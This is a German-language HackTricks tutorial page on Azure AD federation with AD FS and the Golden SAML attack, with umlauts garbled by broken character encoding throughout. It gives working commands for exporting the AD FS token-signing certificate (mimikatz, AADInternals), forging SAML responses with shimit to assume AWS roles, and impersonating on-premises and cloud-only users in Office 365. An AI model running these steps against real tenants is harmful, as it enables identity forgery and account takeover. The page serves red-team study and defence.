# Az - Federation

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundlegende Informationen

[Aus den Dokumenten:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** ist eine Sammlung von **Dom√§nen**, die **Vertrauen** aufgebaut haben. Das Vertrauensniveau kann variieren, umfasst jedoch typischerweise **Authentifizierung** und fast immer **Autorisierung**. Eine typische Federation k√∂nnte eine **Anzahl von Organisationen** umfassen, die Vertrauen f√ºr den **gemeinsamen Zugriff** auf eine Reihe von Ressourcen aufgebaut haben.

Sie k√∂nnen Ihre **On-Premises-Umgebung** mit **Azure AD** f√∂derieren und diese Federation f√ºr Authentifizierung und Autorisierung verwenden. Diese Anmeldemethode stellt sicher, dass alle Benutzer**authentifizierungen vor Ort** erfolgen. Diese Methode erm√∂glicht Administratoren die Implementierung strengerer Zugriffskontrollen. Federation mit **AD FS** und PingFederate ist verf√ºgbar.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Grunds√§tzlich erfolgt bei der Federation alle **Authentifizierung** in der **On-Prem**-Umgebung und der Benutzer erlebt SSO in allen vertrauensw√ºrdigen Umgebungen. Daher k√∂nnen Benutzer **Cloud**-Anwendungen mit ihren **On-Prem-Anmeldeinformationen** **zugreifen**.

**Security Assertion Markup Language (SAML)** wird verwendet, um alle **Authentifizierungs- und Autorisierungsinformationen** zwischen den Anbietern **auszutauschen**.

In jeder Federation-Setup gibt es drei Parteien:

* Benutzer oder Client
* Identity Provider (IdP)
* Service Provider (SP)

(Bilder von https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Zun√§chst greift ein Benutzer auf eine Anwendung (Service Provider oder SP, wie AWS-Konsole oder vSphere-Webclient) zu. Dieser Schritt kann umgangen werden, indem der Client je nach spezifischer Implementierung direkt zum IdP (Identity Provider) geleitet wird.
2. Anschlie√üend identifiziert der SP den entsprechenden IdP (z.B. AD FS, Okta) f√ºr die Benutzerauthentifizierung. Er erstellt dann eine SAML (Security Assertion Markup Language) AuthnRequest und leitet den Client zum ausgew√§hlten IdP um.
3. Der IdP √ºbernimmt die Authentifizierung des Benutzers. Nach der Authentifizierung wird eine SAMLResponse vom IdP erstellt und √ºber den Benutzer an den SP weitergeleitet.
4. Schlie√ülich bewertet der SP die SAMLResponse. Wenn sie erfolgreich validiert wird, was eine Vertrauensbeziehung mit dem IdP impliziert, wird dem Benutzer der Zugriff gew√§hrt. Dies markiert den Abschluss des Anmeldeprozesses und erm√∂glicht dem Benutzer die Nutzung des Dienstes.

**Wenn Sie mehr √ºber SAML-Authentifizierung und h√§ufige Angriffe erfahren m√∂chten, gehen Sie zu:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS ist ein claims-basiertes Identit√§tsmodell.
* "..claims sind einfach Aussagen (zum Beispiel Name, Identit√§t, Gruppe), die √ºber Benutzer gemacht werden und haupts√§chlich zur Autorisierung des Zugriffs auf claims-basierte Anwendungen verwendet werden, die sich √ºberall im Internet befinden."
* Claims f√ºr einen Benutzer werden in den SAML-Token geschrieben und dann vom IdP signiert, um Vertraulichkeit zu gew√§hrleisten.
* Ein Benutzer wird durch ImmutableID identifiziert. Es ist global eindeutig und in Azure AD gespeichert.
* Die ImmutableID wird vor Ort als ms-DS-ConsistencyGuid f√ºr den Benutzer gespeichert und/oder kann aus der GUID des Benutzers abgeleitet werden.
* Weitere Informationen unter [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML Angriff:**

* In ADFS wird die SAML Response von einem Token-Signaturzertifikat signiert.
* Wenn das Zertifikat kompromittiert ist, ist es m√∂glich, sich als JEDER Benutzer, der mit Azure AD synchronisiert ist, bei Azure AD zu authentifizieren!
* Genau wie bei unserem PTA-Missbrauch hat eine Passwort√§nderung f√ºr einen Benutzer oder MFA keine Auswirkungen, da wir die Authentifizierungsantwort f√§lschen.
* Das Zertifikat kann vom AD FS-Server mit DA-Berechtigungen extrahiert und dann von jeder internetverbundenen Maschine aus verwendet werden.
* Weitere Informationen unter [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Der Prozess, bei dem ein **Identity Provider (IdP)** eine **SAMLResponse** zur Autorisierung der Benutzeranmeldung erstellt, ist von entscheidender Bedeutung. Abh√§ngig von der spezifischen Implementierung des IdP kann die **Antwort** mit dem **privaten Schl√ºssel des IdP** **signiert** oder **verschl√ºsselt** werden. Dieses Verfahren erm√∂glicht es dem **Service Provider (SP)**, die Authentizit√§t der SAMLResponse zu best√§tigen und sicherzustellen, dass sie tats√§chlich von einem vertrauensw√ºrdigen IdP ausgestellt wurde.

Ein Vergleich kann mit dem [golden ticket Angriff](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) gezogen werden, bei dem der Schl√ºssel zur Authentifizierung der Identit√§t und Berechtigungen des Benutzers (KRBTGT f√ºr golden tickets, privater Token-Signaturschl√ºssel f√ºr golden SAML) manipuliert werden kann, um ein **Authentifizierungsobjekt** (TGT oder SAMLResponse) zu **f√§lschen**. Dies erm√∂glicht die Nachahmung eines beliebigen Benutzers und gew√§hrt unbefugten Zugriff auf den SP.

Golden SAMLs bieten bestimmte Vorteile:

* Sie k√∂nnen **remote erstellt** werden, ohne Teil der betreffenden Dom√§ne oder Federation zu sein.
* Sie bleiben auch bei aktivierter **Zwei-Faktor-Authentifizierung (2FA)** wirksam.
* Der Token-Signatur-**private Schl√ºssel erneuert sich nicht automatisch**.
* **√Ñndern des Benutzerpassworts macht** einen bereits generierten SAML nicht ung√ºltig.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) ist ein Microsoft-Dienst, der den **sicheren Austausch von Identit√§tsinformationen** zwischen vertrauensw√ºrdigen Gesch√§ftspartnern (Federation) erleichtert. Es erm√∂glicht im Wesentlichen einem Dom√§nendienst, Benutzeridentit√§ten mit anderen Dienstanbietern innerhalb einer Federation zu teilen.

Da AWS der kompromittierten Dom√§ne (in einer Federation) vertraut, kann diese Schwachstelle ausgenutzt werden, um potenziell **beliebige Berechtigungen in der AWS-Umgebung zu erlangen**. Der Angriff erfordert den **privaten Schl√ºssel, der zum Signieren der SAML-Objekte verwendet wird**, √§hnlich wie der KRBTGT bei einem golden ticket Angriff. Der Zugriff auf das AD FS-Benutzerkonto reicht aus, um diesen privaten Schl√ºssel zu erhalten.

Die Anforderungen f√ºr die Durchf√ºhrung eines golden SAML Angriffs umfassen:

* **Token-Signatur privater Schl√ºssel**
* **IdP √∂ffentliches Zertifikat**
* **IdP Name**
* **Rollenname (Rolle zu √ºbernehmen)**
* Dom√§ne\Benutzername
* Rollensitzungsname in AWS
* Amazon-Konto-ID

_Nur die fettgedruckten Elemente sind obligatorisch. Die anderen k√∂nnen nach Belieben ausgef√ºllt werden._

Um den **privaten Schl√ºssel** zu erwerben, ist der Zugriff auf das **AD FS-Benutzerkonto** erforderlich. Von dort aus kann der private Schl√ºssel mit Tools wie [mimikatz](https://github.com/gentilkiwi/mimikatz) **aus dem pers√∂nlichen Speicher exportiert** werden. Um die anderen erforderlichen Informationen zu sammeln, k√∂nnen Sie das Microsoft.Adfs.Powershell-Snapin wie folgt verwenden, wobei Sie sicherstellen, dass Sie als ADFS-Benutzer angemeldet sind:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Mit all diesen Informationen ist es m√∂glich, eine g√ºltige SAMLResponse als den Benutzer, den Sie imitieren m√∂chten, mit [**shimit**](https://github.com/cyberark/shimit) zu vergessen**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Es ist auch m√∂glich, ImmutableID von nur Cloud-Benutzern zu erstellen und sie zu imitieren.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referenzen

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
